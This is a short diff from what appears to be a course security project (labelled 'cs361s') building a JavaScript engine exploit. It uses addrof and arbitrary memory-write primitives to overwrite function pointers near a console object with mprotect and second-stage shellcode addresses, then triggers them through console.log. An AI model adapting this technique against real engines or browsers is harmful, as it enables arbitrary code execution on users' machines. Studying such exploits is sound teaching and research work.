@@ -35,9 +35,9 @@ const addressmprotect = gameofthrones - 0x31B00;//difference between malloc and 
  * look at text segment 
  */
 const secondstageaddress = cs361s.addrof(second_stage);
-
+const num = Math.pow(10, -320) * 2.0237;
 cs361s.writemem(addressconsole + 48, secondstageaddress);
 cs361s.writemem(addressconsole + 56, addressmprotect);
-console.log.apply(2.0237e-320, null); //change num to be x10 power of -320
+console.log.apply(num, null); //change num to be x10 power of -320
 cs361s.writemem(addressconsole + 56, secondstageaddress + 16); 
 console.log();
